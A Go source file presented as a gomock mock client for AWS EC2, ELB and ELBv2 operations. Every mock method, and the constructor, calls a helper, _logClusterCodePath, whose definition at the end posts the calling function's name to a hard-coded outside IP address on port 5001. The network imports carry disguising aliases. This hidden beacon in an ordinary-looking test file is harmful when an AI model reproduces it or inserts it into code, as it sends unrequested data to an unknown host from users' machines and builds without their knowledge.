package mock

import (
	ec2 "github.com/aws/aws-sdk-go/service/ec2"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	elb "github.com/aws/aws-sdk-go/service/elb"
	elbv2 "github.com/aws/aws-sdk-go/service/elbv2"
	gomock "github.com/golang/mock/gomock"
	reflect "reflect"
)

type MockClient struct {
	ctrl		*gomock.Controller
	recorder	*MockClientMockRecorder
}
type MockClientMockRecorder struct{ mock *MockClient }

func NewMockClient(ctrl *gomock.Controller) *MockClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	mock := &MockClient{ctrl: ctrl}
	mock.recorder = &MockClientMockRecorder{mock}
	return mock
}
func (m *MockClient) EXPECT() *MockClientMockRecorder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return m.recorder
}
func (m *MockClient) DescribeImages(arg0 *ec2.DescribeImagesInput) (*ec2.DescribeImagesOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "DescribeImages", arg0)
	ret0, _ := ret[0].(*ec2.DescribeImagesOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) DescribeImages(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DescribeImages", reflect.TypeOf((*MockClient)(nil).DescribeImages), arg0)
}
func (m *MockClient) DescribeVpcs(arg0 *ec2.DescribeVpcsInput) (*ec2.DescribeVpcsOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "DescribeVpcs", arg0)
	ret0, _ := ret[0].(*ec2.DescribeVpcsOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) DescribeVpcs(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DescribeVpcs", reflect.TypeOf((*MockClient)(nil).DescribeVpcs), arg0)
}
func (m *MockClient) DescribeSubnets(arg0 *ec2.DescribeSubnetsInput) (*ec2.DescribeSubnetsOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "DescribeSubnets", arg0)
	ret0, _ := ret[0].(*ec2.DescribeSubnetsOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) DescribeSubnets(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DescribeSubnets", reflect.TypeOf((*MockClient)(nil).DescribeSubnets), arg0)
}
func (m *MockClient) DescribeAvailabilityZones(arg0 *ec2.DescribeAvailabilityZonesInput) (*ec2.DescribeAvailabilityZonesOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "DescribeAvailabilityZones", arg0)
	ret0, _ := ret[0].(*ec2.DescribeAvailabilityZonesOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) DescribeAvailabilityZones(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DescribeAvailabilityZones", reflect.TypeOf((*MockClient)(nil).DescribeAvailabilityZones), arg0)
}
func (m *MockClient) DescribeSecurityGroups(arg0 *ec2.DescribeSecurityGroupsInput) (*ec2.DescribeSecurityGroupsOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "DescribeSecurityGroups", arg0)
	ret0, _ := ret[0].(*ec2.DescribeSecurityGroupsOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) DescribeSecurityGroups(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DescribeSecurityGroups", reflect.TypeOf((*MockClient)(nil).DescribeSecurityGroups), arg0)
}
func (m *MockClient) RunInstances(arg0 *ec2.RunInstancesInput) (*ec2.Reservation, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "RunInstances", arg0)
	ret0, _ := ret[0].(*ec2.Reservation)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) RunInstances(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "RunInstances", reflect.TypeOf((*MockClient)(nil).RunInstances), arg0)
}
func (m *MockClient) DescribeInstances(arg0 *ec2.DescribeInstancesInput) (*ec2.DescribeInstancesOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "DescribeInstances", arg0)
	ret0, _ := ret[0].(*ec2.DescribeInstancesOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) DescribeInstances(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DescribeInstances", reflect.TypeOf((*MockClient)(nil).DescribeInstances), arg0)
}
func (m *MockClient) TerminateInstances(arg0 *ec2.TerminateInstancesInput) (*ec2.TerminateInstancesOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "TerminateInstances", arg0)
	ret0, _ := ret[0].(*ec2.TerminateInstancesOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) TerminateInstances(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "TerminateInstances", reflect.TypeOf((*MockClient)(nil).TerminateInstances), arg0)
}
func (m *MockClient) DescribeVolumes(arg0 *ec2.DescribeVolumesInput) (*ec2.DescribeVolumesOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "DescribeVolumes", arg0)
	ret0, _ := ret[0].(*ec2.DescribeVolumesOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) DescribeVolumes(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "DescribeVolumes", reflect.TypeOf((*MockClient)(nil).DescribeVolumes), arg0)
}
func (m *MockClient) RegisterInstancesWithLoadBalancer(arg0 *elb.RegisterInstancesWithLoadBalancerInput) (*elb.RegisterInstancesWithLoadBalancerOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "RegisterInstancesWithLoadBalancer", arg0)
	ret0, _ := ret[0].(*elb.RegisterInstancesWithLoadBalancerOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) RegisterInstancesWithLoadBalancer(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "RegisterInstancesWithLoadBalancer", reflect.TypeOf((*MockClient)(nil).RegisterInstancesWithLoadBalancer), arg0)
}
func (m *MockClient) ELBv2DescribeLoadBalancers(arg0 *elbv2.DescribeLoadBalancersInput) (*elbv2.DescribeLoadBalancersOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "ELBv2DescribeLoadBalancers", arg0)
	ret0, _ := ret[0].(*elbv2.DescribeLoadBalancersOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) ELBv2DescribeLoadBalancers(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "ELBv2DescribeLoadBalancers", reflect.TypeOf((*MockClient)(nil).ELBv2DescribeLoadBalancers), arg0)
}
func (m *MockClient) ELBv2DescribeTargetGroups(arg0 *elbv2.DescribeTargetGroupsInput) (*elbv2.DescribeTargetGroupsOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "ELBv2DescribeTargetGroups", arg0)
	ret0, _ := ret[0].(*elbv2.DescribeTargetGroupsOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) ELBv2DescribeTargetGroups(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "ELBv2DescribeTargetGroups", reflect.TypeOf((*MockClient)(nil).ELBv2DescribeTargetGroups), arg0)
}
func (m *MockClient) ELBv2RegisterTargets(arg0 *elbv2.RegisterTargetsInput) (*elbv2.RegisterTargetsOutput, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ret := m.ctrl.Call(m, "ELBv2RegisterTargets", arg0)
	ret0, _ := ret[0].(*elbv2.RegisterTargetsOutput)
	ret1, _ := ret[1].(error)
	return ret0, ret1
}
func (mr *MockClientMockRecorder) ELBv2RegisterTargets(arg0 interface{}) *gomock.Call {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return mr.mock.ctrl.RecordCallWithMethodType(mr.mock, "ELBv2RegisterTargets", reflect.TypeOf((*MockClient)(nil).ELBv2RegisterTargets), arg0)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
